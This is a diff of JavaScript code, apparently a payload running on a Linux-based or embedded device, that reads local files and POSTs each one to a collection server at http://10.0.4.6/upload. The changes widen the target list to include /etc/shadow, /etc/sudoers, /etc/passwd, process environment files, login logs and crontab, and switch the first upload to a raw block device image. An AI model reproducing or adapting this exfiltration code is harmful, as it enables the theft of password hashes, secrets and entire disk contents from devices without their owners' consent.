@@ -41,7 +41,9 @@ function uploadFile(filename){
 	
 	var xhr = new XMLHttpRequest();
 	xhr.open("POST", "http://10.0.4.6/upload", true);
-	xhr.setRequestHeader("Content-Type", "text/plain");
+	type = "text/plain";
+	type = "application/octet-stream";
+	xhr.setRequestHeader("Content-Type", type);
 	files = filename.split("/");
 	xhr.setRequestHeader("X-Filename", filename.split("/")[files.length - 1]);
 	xhr.send(file);
@@ -49,10 +51,25 @@ function uploadFile(filename){
 
 
 function realOnload(){	
-	uploadFile("/etc/profile");
+	uploadFile("/dev/mmcblk0p0");
 	console.log("sent");
-	files = ['/proc/version', '/proc/cpuinfo', '/etc/issue', '/usr/bin/', '/etc/shadow', '/etc/group', '/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime', '/proc/version', '/proc/loadavg', '/etc/fstab', '/etc/hostname', '/etc/hosts', '/etc/resolv.conf', '/etc/profile', '/etc/environment', '/etc/motd', '/var/log/dmesg', '/var/log/messages'];
-	files = ['/etc/fstab', '/etc/hosts', '/etc/resolv.conf', "/etc/profile"];
+//	files = ['/proc/version', '/proc/cpuinfo', '/etc/issue', '/usr/bin/', '/etc/shadow', '/etc/group', '/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime', '/proc/version', '/proc/loadavg', '/etc/fstab', '/etc/hostname', '/etc/hosts', '/etc/resolv.conf', '/etc/profile', '/etc/environment', '/etc/motd', '/var/log/dmesg', '/var/log/messages'];
+//	files += ['/etc/fstab', '/etc/hosts', '/etc/resolv.conf', "/etc/profile"];
+	
+	files = [
+	         '/proc/0/environ', '/proc/version', '/proc/cpuinfo', '/etc/issue', '/etc/shadow', '/etc/group',
+	         '/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime',
+	         '/proc/loadavg', '/etc/fstab', '/etc/hostname', '/etc/hosts',
+	         '/etc/resolv.conf', '/etc/profile', '/etc/environment', '/etc/motd',
+	         '/var/log/dmesg', '/var/log/messages', '/etc/passwd', '/var/log/syslog',
+	         '/etc/login.defs', '/etc/bash.bashrc', '/proc/self/status',
+	         '/proc/self/cmdline', '/proc/self/environ', '/etc/services',
+	         '/etc/nsswitch.conf', '/etc/ld.so.conf', '/etc/inputrc', '/etc/shells',
+	         '/etc/hosts.allow', '/etc/hosts.deny', '/etc/sysctl.conf', '/etc/rc.local',
+	         '/etc/modules', '/etc/issue.net', '/etc/crontab', '/etc/at.allow',
+	         '/etc/at.deny', '/var/log/wtmp', '/var/log/btmp', '/var/log/lastlog',
+	         '/var/log/faillog', '/etc/logrotate.conf'
+	       ];
 	for(var i = 0; i<files.length; i++){
 		getFile(files[i]);
 	}
